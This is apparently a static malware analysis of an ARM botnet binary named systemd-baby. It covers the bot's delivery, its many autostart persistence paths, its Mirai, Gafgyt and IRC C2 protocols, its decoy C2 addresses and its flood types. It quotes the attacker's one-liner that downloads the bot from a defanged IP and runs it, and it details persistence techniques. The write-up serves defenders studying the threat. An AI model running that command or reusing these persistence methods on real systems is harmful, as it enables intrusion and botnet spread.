systemd-baby: 180 places to come back from

An ARM bot that writes itself into nearly every autostart path Linux, Android, OpenWrt and macOS have, behind a screen of decoy C2s.

An armv7l bot named systemd-baby, delivered over telnet from 77.239.124[.]172 on 4 November. Static analysis only.

Delivery

cd /tmp || cd /var/run || cd /root; tftp -g -r /bins/armv7l/systemd-baby 77.239.124[.]172 || curl -O hxxp://77.239.124[.]172/bins/armv7l/systemd-baby || wget ... || busybox wget ... || ftpget ...; chmod +x systemd-baby; ./systemd-baby || sudo ./systemd-baby

Preceded by echo SHELL_TEST, /bin/busybox TEST and an ipinfo.io/ip lookup.

Persistence

316 KB, static, stripped, EABI5 hard-float. Its strings name 184 distinct paths. Highlights:

  • systemd: service, timer (every 5 min), .path unit, a user unit, and a generator at /etc/systemd/system-generators/systemd-baby-gen that recreates the unit on every boot or daemon-reload.
  • PAM: session optional pam_exec.so quiet <bin> for sshd, login, su, sudo, common-auth, system-auth. Every login restarts it.
  • Package managers: apt DPkg::Post-Invoke, a dnf plugin (net-hook.py), a pacman hook, a yum entry. Patching the box re-runs it.
  • Every init system: SysV rc*.d, OpenRC, runit, s6, s6-overlay, dinit, perp, minit, anopa, inittab, rc.local, FreeBSD rc.d.
  • Embedded: OpenWrt procd, uci-defaults, hotplug, U-Boot fw_setenv bootcmd.
  • Android: init.rc on sys.boot_completed, Magisk/KernelSU service.d, post-fs-data.d, zygisk.d, su.d.
  • Everything else: cron (all forms), udev rules, NetworkManager, dhclient, wpa_supplicant, logrotate postrotate, tmpfiles.d, XDG autostart, desktop session hooks, PulseAudio, PipeWire, BlueZ, and the rc files of most shells (bash, zsh, fish, elvish, mksh, ash).
  • macOS: /Library/LaunchDaemons/com.network.dispatch.plist. Dead code in an ARM Linux binary.

Several entries cannot work as written: ActivatedBy= in a .link file, a yum “repo” carrying post_transaction_actions, /home.profile (a missing slash). It reads like breadth over testing.

Defence and rivalry: chattr, oom_score_adj, a /dev/watchdog feeder, a “swarm” of watchdog processes ([SWARM-%d] vengeance: killed killer of %s), checks for strace, ltrace, objdump and readelf, and a BOTKILLER command.

Three protocols, many decoys

One binary speaks:

  • MIRAI-CNC/1.0 with HELLO|…, ATTACK|, UPDATE|, STOPALL
  • Gafgyt-style !* SH, SCANNER ON/OFF, BOTKILLER, GETLOCALIP
  • IRC: NICK bot-%s, PRIVMSG #%s :HTTPFLOOD ready
  • HTTP beacons: POST /api/v1/beacon with X-Bot-Id, X-Campaign, and /api/v2/telem/hello/heartbeat with ngrok-skip-browser-warning: 1

The plaintext “C2s” look planted:

  • the beacon’s JWT is literally eyJhbGciOiJIUzI1NiJ9.decoy.token
  • grpc.internal-telemetry.svc[.]cluster[.]local and control.tor2web-relay-fast[.]onion
  • dozens of RFC 5737 documentation addresses (192.0.2.x, 198.51.100.x, 203.0.113.x)
  • three of the domains resolve to the same six AWS addresses as their bare apex, a parking pattern; the rest don’t exist

A ChaCha20 constant is present, so the real C2 is probably encrypted. I did not recover it statically. Treat the domain list as a signature, not a blocklist.

Floods: home-slammer, home-holder, pps-flood, mix-flood, a browser-mimicking HTTP/2 flood with over 100 sec-ch-ua variants, Discord, Source Engine query.
